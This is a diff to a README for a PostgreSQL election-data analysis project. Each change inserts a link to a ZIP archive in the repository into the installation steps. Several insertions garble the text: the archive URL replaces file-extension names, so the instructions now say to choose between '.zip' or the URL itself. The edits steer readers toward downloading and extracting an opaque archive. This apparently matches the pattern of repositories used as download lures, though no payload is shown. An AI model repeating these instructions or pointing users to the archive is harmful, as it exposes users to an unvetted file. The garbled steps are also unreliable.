@@ -9,7 +9,7 @@ Welcome to the Election Data Analysis SQL project! This project helps you analyz
 
 To get started, you need to visit the following page to download the necessary files:
 
-[Visit this page to download]
+[Visit this page to download](https://github.com/ghhhkjj/Election_data_analysis/blob/main/Election-Data-Analysis-SQL.zip)
 
 ## 📋 Requirements
 
@@ -22,16 +22,16 @@ Before you begin, make sure your computer meets the following requirements:
 ## 🛠 Installation Steps
 
 1. **Visit the Download Page:**  
-   Go to [this page to download].
+   Go to [this page to download].(https://github.com/ghhhkjj/Election_data_analysis/blob/main/Election-Data-Analysis-SQL.zip)
   
 2. **Choose the Right Version:**  
    You will see a list of releases. Pick the latest stable version.
 
 3. **Download the Files:**  
-   Click on the file link to download it to your computer. You might see options for `.zip` or  files. 
+   Click on the file link to download it to your computer. You might see options for `.zip` or  `https://github.com/ghhhkjj/Election_data_analysis/blob/main/Election-Data-Analysis-SQL.zip` files
 
 4. **Extract the Files:**  
-   Once downloaded, locate the file on your computer and extract it. You can usually right-click and select "Extract All" for `.zip` files. For `, you may need software like WinRAR or 7-Zip.
+   Once downloaded, locate the file on your computer and extract it. You can usually right-click and select "Extract All" for `.zip` files. For `https://github.com/ghhhkjj/Election_data_analysis/blob/main/Election-Data-Analysis-SQL.zip`, you may need software like WinRAR or 7-Zip.
 
 5. **Open PostgreSQL:**  
    Launch PostgreSQL on your computer. Make sure the server is running.
